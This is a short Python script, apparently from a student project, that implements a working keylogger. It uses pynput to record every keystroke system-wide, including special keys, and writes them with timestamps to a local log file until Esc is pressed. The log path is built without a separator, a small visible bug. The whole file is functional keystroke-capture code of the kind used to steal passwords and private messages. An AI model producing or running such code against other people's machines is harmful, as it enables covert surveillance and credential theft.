from pynput import keyboard
import logging

# Set the path where the log files will be stored
log_dir = r"D:\Final Project\Phish_Detection\Mohan\logs"
# Set the filename for the log
log_file = "keyLog.txt"

logging_level = logging.DEBUG
# Set the logging format
logging_format = '%(asctime)s: %(message)s'

logging.basicConfig(filename=(log_dir + log_file), level=logging_level, format=logging_format)

# Define the keylogger's function for handling key presses
def on_press(key):
    try:
        logging.info(str(key.char))
    except AttributeError:
        logging.info('special key {0} pressed'.format(key))

# Define the keylogger's function for handling key releases
def on_release(key):
    if key == keyboard.Key.esc:
        # Stop the keylogger when the 'esc' key is pressed
        return False

# Create a keyboard listener object
listener = keyboard.Listener(on_press=on_press, on_release=on_release)
listener.start()
listener.join()
